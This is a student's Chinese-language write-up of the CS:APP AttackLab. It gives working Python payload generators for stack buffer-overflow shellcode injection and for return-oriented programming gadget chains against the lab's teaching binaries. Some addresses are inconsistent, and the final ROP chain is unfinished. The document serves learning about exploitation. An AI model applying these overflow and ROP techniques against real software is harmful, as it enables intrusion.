# AttackLab

## Code injection
### touch 1 填充缓冲区跳转

在 `getbuf` 打断点,输入字符串后看栈帧：

```asm
00:0000│ rsp 0x5561dc78 ◂— 0
... ↓        3 skipped
04:0020│     0x5561dc98 —▸ 0x55586000 ◂— 0
05:0028│     0x5561dca0 —▸ 0x401976 (test+14) ◂— mov edx, eax
06:0030│     0x5561dca8 —▸ 0x55685fe8 —▸ 0x402fa5 ◂— push 0x3a6971 /* 'hqi:' */
07:0038│     0x5561dcb0 —▸ 0x401f24 (launch+112) ◂— cmp dword ptr [rip + 0x2025bd], 0
```

gdbpwn 中是向下增长的，所以要反过来看，可以看到，最上层的是当前栈顶，下面的 `(test+14)` 就是返回地址，如果修改到这个地址，也许就能出发 touch1。 touch1 的地址在 `objdump -d ctarget` 里可以找到，或者执行 `print touch1`。

所以接下来的问题在于如何通过 `getbuf` 来修改地址。需要观察，从 rsp 到 test+14，一共是 0000-0028,也就是说还需要 0x28=40 个字节来填充，而 hexdump 程序可以对序列进行转换，所以填充 41，就会自动处理成一个字节。payload:

```txt
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
c0 17 40 00 00 00 00 00
```

这里还需要注意，由于 intel 是小端存储，所以需要将地址 00..004017c0 倒序插入。

补充：

不要直接看 `ret_addr - rsp`，动态分析可能不准。在 gdb 中执行 `disas getbuf`，可以直接看到 getbuf 所分配的缓冲区大小，进而针对性爆破。

用 python 实现自动化生成 payload

```python
# solve_phase1.py
import struct

# 1. 填充垃圾数据 (Padding)
# 0x28 = 40 bytes
padding = b'A' * 40

# 2. 目标地址 (Target Address)
# touch1 的地址，比如 0x4017c0
# 使用 struct.pack 处理小端序 (Little Endian)，'<Q' 代表 64位无符号小端
target_addr = struct.pack('<Q', 0x4017ec)

# 3. 拼接
payload = padding + target_addr

# 4. 输出
# 在终端里运行: python3 solve_phase1.py > exploit.txt
import sys
sys.stdout.buffer.write(payload)
```

### touch 2 注入汇编跳转

由于和 touch1 是一样的程序，所以将地址改成 touch2 的进去看看。发现：

```asm
mov    edx, edi                            EDX => 0
mov    dword ptr [rip + 0x202ce0], 2       [vlevel] <= 2
cmp    edi, dword ptr [rip + 0x202ce2]     0x0 - 0x59b997fa     EFLAGS => 0x297 [ CF PF AF zf SF IF df of ]  0x401802 <touch2+22>  ✔ 
jne    touch2+56
```

意思是检测 edi 的值是否和 cookie 相等，那也就意味着需要修改 edi 的值。由于是 CI,所以还不考虑 ROP, 也就是说向缓存区中注入汇编代码以后，是可以执行的！所以思路就是填充 -> 跳转到注入的缓存区 -> 执行注入的汇编（修改 edi 的值、再 jump 到 touch2）。用 push + ret 可以规避使用 jump 的相对寻址问题。

以下是脚本（但是是 AI 写的……）

```python
import struct
import sys

# --- 第一部分：注入的机器码 (Shellcode) ---
# 这段代码对应的汇编是：
# mov $0x59b997fa, %rdi   (把 Cookie 放进第一个参数寄存器)
# push $0x4017ec          (把 touch2 的地址压栈，为 ret 做准备)
# ret                     (跳向 touch2)
# 机器码可以手动获取或通过工具生成：
code = b"\x48\xc7\xc7\xfa\x97\xb9\x59\x68\xec\x17\x40\x00\xc3"

# --- 第二部分：计算填充 (Padding) ---
# 缓冲区总大小是 40 字节。
# 填充 = 40字节 - 机器码长度
padding = b'A' * (40 - len(code))

# --- 第三部分：新的返回地址 (New Return Address) ---
# 这个地址不再是 touch2 的地址！
# 而是你注入的代码在栈上的起始地址。
# 根据你之前的 GDB 输出，应该是 0x5561dc78
stack_addr = struct.pack('<Q', 0x5561dc78)

# --- 拼接并输出 ---
payload = code + padding + stack_addr
sys.stdout.buffer.write(payload)
```

补充

在读取字节流的时候，指令译码器会自动识别操作类型，从而实现指定字节的读取（而不用填充）。

可以将汇编的文本文件存储到 inject.s 中，然后 `gcc -c inject.s -o inject.o` 产生汇编（需要只编译不连接），最后提取机器码 `objdump -d inject.o`。因为 inject.s 里存储的是 ASCII 码，还需要转换为 .o 才能被提取为机器码。

### touch 3 字符串比较

看看 touch3 的判断代码，发现：

```c
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}
```

也就是比较 cookie 和传入的 sval 指针指向的字符串是否相等。一开始的想法是，直接将 sval 设置为指向 cookie 的指针不就可以了吗？所以 inject.s 就这样写：

```asm
mov $0x59b997fa,%rdi
push $0x4018fa
ret
```

但是发生了段错误，怎么回事呢？gdb 调试了以后确实没问题。问了 AI 才知道，错误的点在于这样 sval 指向的是一个数字！hexmatch 中将 cookie 转变为字符串了，所以这个字符串得自己构造才行。exp:

```python
import struct
import sys

# 1. 你的注入代码 (注意：rdi 指向计算出来的字符串地址)
# 汇编：
# movabs $0x5561dca8, %rdi  <-- 这里的地址就是 栈顶 + 48,指向字符串
# pushq  $0x4018fa          <-- touch3 的地址
# ret
# 对应的机器码如下：
code = b"\x48\xbf\xa8\xdc\x61\x55\x00\x00\x00\x00\x68\xfa\x18\x40\x00\xc3"

# 2. 填充数据 (填充到 40 字节)
padding = b'A' * (40 - len(code))

# 3. 返回地址 (指向栈顶，即代码开始执行的地方)
return_addr = struct.pack('<Q', 0x5561dc78)

# 4. 你的 Cookie 字符串 (这就是 rdi 要找的东西)
# 注意末尾一定要有 \x00 (字符串结束符)
cookie_str = b"59b997fa\x00"

# 5. 组装成最终的 Payload
payload = code + padding + return_addr + cookie_str

# 输出到终端（你可以重定向到文件）
sys.stdout.buffer.write(payload)
```

关键是还不太会算地址值。其实就是从栈底开始，依次安排想要注入的东西：引向字符串的 code + 填充 + 返回 touch3 的地址（这里也是初始的返回地址） + 字符串。

补充：

```graph
高地址 (High Address)
+----------------------+
|   Cookie String      |  <-- 这是我们存放数据的地方 (Data Segment)
|  "59b997fa\0"        |
|  (地址 = RSP + 48)    |
+----------------------+
|   Return Address     |  <-- 覆盖原来的返回地址
|  (指向 Buffer 起始)   |
+----------------------+
|   Padding (40字节)   |  <-- 填充物
|   + Shellcode        |  <-- 你的代码 (Code Segment)
|                      |
| RSP -> [ code... ]   |
+----------------------+
低地址 (Low Address)
```

十六进制加法计算：
- `p/x 0x5561dc78 + 48` 
- 脚本里直接写 `cookie_addr = stack_start + 48`

### ROP touch2 利用原有函数进行数据注入

与上面不同的是，这里使用了 ASLR,导致不能用固定地址，所以只能在题目给出的 farm 当中寻找可用的字段。但是看了 farm 的反汇编代码，发现只有 mov、lea,并没有需要的 pop（因为只有 pop 才能让我们定向地改变寄存器中的数值），问了 AI 以后发现，这是一种**指令截断**，也就是说，所需要的 pop+ret 隐藏在了普通的功能性代码中！

具体来说，这一问需要的是修改 edi 中的数据，所以需要找 pop %edi 相关的语句，对应的**机器码**是 `5f c3`，有趣的是，只要指令中存在就可以执行。如：

```asm
402d10: 8d 48 5f  leal 0x5f(%rax), %ecx
402d13: c3        ret
```

虽然 `5f c3` 是分开的，但是如果返回地址指向 `402d12`,就会执行 pop（5f） ret（c3）！但是，找遍 farm,也没有看到 `5f c3`,所以可能还需要其他的 pop + mov 来进行中转。找了半天没找到，AI 找到了：`58 90 c3`（要注意 90 是 nop！）,也就是 `pop &rax ; nop ; ret`,可以先将数据放到 rax 里，再通过 `48 89 c7` 进行 `mov %rax, %rdi`，即可完成。

> 所以构造的链从低地址到高地址依次是：填充->跳转到touch2->跳转到mov->Cookie的数值->跳转到pop（同时覆盖原有的栈顶），这样执行就会直接执行 pop 地址，从高到低执行。

修正：上面的理解有问题。实际上，在运行 getbuf 的时候，rsp 是不会动的（始终指向栈顶！），所以需要用 padding 将第一个要跳转的地址垫到 rsp 指向的地方。所以离 padding 越近，越先进行攻击！所以链应该是：`Padding -> Gadget 1（这里才是 rsp 指向的原来 ret 地址的位置） -> Cookie -> Gadget 2 -> touch2`。payload： 

```python
import struct

# 1. 基础配置
# 这里的填充字节数需要根据你的 getbuf 缓冲区大小来定，通常是 40
padding_size = 40 

# 2. 你的专属 Cookie (请替换成 cookie.txt 里的真实值)
cookie = 0x59b997fa 

# 3. 目标函数 touch2 的地址 (在反汇编文件开头寻找 <touch2>:)
touch2_addr = 0x4017ec 

# 4. 我们找到的 Gadgets 地址
# Gadget 1: pop %rax; nop; ret (对应 58 90 c3)
gadget1_pop_rax = 0x4019cc 
# Gadget 2: mov %rax, %rdi; ret (对应 48 89 c7 c3)
gadget2_mov_rax_rdi = 0x4019a2 

def to_le(val):
    """将地址或数值转换为 8 字节的小端序十六进制字符串"""
    # Q 代表 8 字节无符号长整型 (64位)
    return struct.pack("<Q", val)

def generate():
    # 开始构建 Payload
    payload = b""
    
    # A. 填充缓冲区 (可以使用任何字符，这里用 00)
    payload += b"\x00" * padding_size
    
    # B. 覆盖返回地址 -> 跳转到第一个 Gadget
    payload += to_le(gadget1_pop_rax)
    
    # C. 放置 Cookie -> 这个值会被 Gadget 1 的 pop %rax 弹入寄存器
    payload += to_le(cookie)
    
    # D. 放置第二个 Gadget 地址 -> 第一个 Gadget 的 ret 会跳到这里
    payload += to_le(gadget2_mov_rax_rdi)
    
    # E. 放置 touch2 的地址 -> 第二个 Gadget 的 ret 会跳到这里
    payload += to_le(touch2_addr)
    
    # 将结果写入文件
    with open("payload.txt", "wb") as f:
        f.write(payload)
    
    print("Payload 已生成到 payload.txt")
    print("你可以通过以下命令将其转换为提交格式：")
    print("./hex2raw < payload.txt > payload_raw.txt")

if __name__ == "__main__":
    generate()
```

### ROP touch3 多轮调用注入字符串

这题和上面的 touch3 一样，需要传递一个字符串指针，所以需要自己构造字符串、并将字符串地址传入 touch3 的指定寄存器（rsi）。但是这里的问题在于地址是随机的，不能像上面用固定地址，于是考虑用相对寻址来进行规避。但是要先注意： 

- mov 执行访存，而 lea 不执行，直接将地址放到寄存器，所以存地址要用 lea,接下来的任务就是寻找可以用的指令了。
- 对 eai 等寄存器进行写入（而非 r..），会自动把该寄存器的高位清零（在 64 位机器中）。所以不能使用 movl 等只处理低位的指令。
- 题目没有给 lea 的机器码……，问 AI 得知：`lea (%rdi, %rsi, 1), %rax`：字节码通常是 `48 8d 04 37`。

由于最后是要传到 edi,所以先找能修改 edi 的指令。包括 movq、pop、lea

![image.png](https://raw.githubusercontent.com/calendar0917/images/master/20260107221213145.png)

```asm
可能用到的：
# 用于构造 mov rax -> rdi
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret
# 用于构造 lea rdi+rsi -> rax,发现这里有偏移，所以还要构造偏移，指定 rsi。
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret
# 用于构造 movq rcx -> rsi,断了，没用
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	ret
# 没有找到 pop ecx，还要继续找 movq ecx,也没找到，链断了……
# 用于返回栈地址 movq rsp -> rax
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	ret
# 用于 pop 出信息给 eax，同上一个 level
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	ret
# 实在找不到了，没有传送给 ecx 的链，问了AI,找到下面这个
# 用于 movl edx -> ecx，这里太坑了！08 db 是合法序列，而且还是 32 位寄存器……
0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	ret

```

上面找的链构成了一个闭环，也就可以进行构造了。目前有的：
- pop -> eax ，直接传值
- mov rax -> rdi
- lea rdi+rsi -> rax
- movq rcx -> rsi
- movq rsp -> rax 重要，返回栈地址
- movl eax -> ecx

思路：
- 调用 touch3
- 改变传入 touch3 的 rdi，使其指向一个字符串,rax -> rdi
- 字符串的定位通过 rdi+rsi -> rax
- rdi 是栈地址，通过 rsp -> rax -> rdi 确认
- rsi 是偏移值，通过 pop eax -> ecx -> esi 确认，但是需要计算

生成链的结构大致是（地址由低到高）：
- padding
- cookie-string （这里可能有问题，最好放在 ROP 链最后）
- pop -> eax（初始返回地址，首个执行）
- esi 偏移值（直接 pop 给 eax）
- eax -> ecx
- ecx -> esi
- rsp -> rax（这里才读取了 rsp,要注意？rsp 会自动上移！）
- rax -> rdi
- rdi+rsi -> rax
- rax -> rdi
- touch3

大体思路如此，EXP 懒得调试了……